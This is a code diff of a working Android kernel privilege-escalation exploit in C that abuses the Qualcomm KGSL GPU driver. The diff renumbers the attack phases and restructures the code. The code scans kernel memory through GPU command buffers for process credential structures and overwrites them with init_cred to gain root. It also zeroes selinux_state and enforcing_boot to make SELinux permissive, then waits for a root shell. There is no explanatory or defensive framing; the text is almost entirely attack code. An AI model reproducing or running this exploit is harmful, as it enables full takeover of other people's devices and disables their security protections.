@@ -205,7 +205,7 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    printf("[*] Phase 7: GPU scan for cred pages\n");
+    printf("[*] Phase 6: GPU scan for cred pages\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
     void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
@@ -225,9 +225,9 @@ int main(int argc, char **argv) {
 
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
-        uint32_t *cmd = (uint32_t *)ib_m;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
+        uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int i = 0; i < SCAN_DWORDS; i++) {
@@ -261,49 +261,47 @@ int main(int argc, char **argv) {
             n_cred++;
         }
     }
-    printf("\n[*] Scan complete: found %d cred pages\n", n_cred);
+    printf("\n[*] Phase 6 complete: found %d cred pages\n", n_cred);
 
-    if (n_cred > 0) {
-        printf("[*] Phase 8: Overwrite cred with init_cred (uid=0, caps)\n");
-        for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_pages[p] + cred_offs[p];
-            uint32_t *cmd = (uint32_t *)ib_m;
-            int dw = 0;
-            memset(ib_m, 0, 0x10000);
-            memset(dst_m, 0, 0x1000);
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            // Copy first 0x100 bytes from init_cred to cred page
-            for (int i = 0; i < 0x100/4; i++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + i*4, &dl, &dh);
-                split64(init_cred_addr + i*4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            for (int i = 0; i < 0x100/4; i++) {
-                uint32_t dl, dh, sl, sh;
-                split64(cbase + i*4, &dl, &dh);
-                split64(dst_ga + i*4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-        }
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] Cred overwrite done\n");
-    } else {
-        printf("[-] No cred pages found\n");
+    if (n_cred == 0) {
+        printf("[-] No cred pages found, aborting\n");
         return 1;
     }
 
-    // ===== Phase 9: Zero selinux_state to make SELinux permissive =====
-    printf("[*] Phase 9: Zeroing selinux_state and enforcing_boot\n");
+    printf("[*] Phase 7: Overwrite cred with init_cred (uid=0, caps)\n");
+    for (int p = 0; p < n_cred && p < 32; p++) {
+        uint64_t cbase = cred_pages[p] + cred_offs[p];
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < 0x100/4; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(init_cred_addr + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        for (int i = 0; i < 0x100/4; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(cbase + i*4, &dl, &dh);
+            split64(dst_ga + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx_id, ts);
+    }
+    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+    printf("[+] Cred overwrite done\n");
+
+    printf("[*] Phase 8: Zero selinux_state (make SELinux permissive)\n");
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
@@ -319,7 +317,6 @@ int main(int argc, char **argv) {
             cmd[dw++] = al; cmd[dw++] = ah;
             cmd[dw++] = 0;
         }
-        // Also zero enforcing_boot variable
         uint64_t enforcing_boot = FIXED_ENFORCING_BOOT;
         for (int i = 0; i < 4; i++) {
             uint64_t addr = enforcing_boot + i;
@@ -338,7 +335,7 @@ int main(int argc, char **argv) {
         printf("[+] selinux_state zeroed\n");
     }
 
-    printf("[*] Phase 10: Cache eviction\n");
+    printf("[*] Phase 9: Cache eviction\n");
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     if (ev != MAP_FAILED) {
@@ -348,7 +345,7 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    printf("[*] Phase 11: Waiting for root shell...\n");
+    printf("[*] Phase 10: Waiting for root shell...\n");
     close(notify_pipe[1]);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
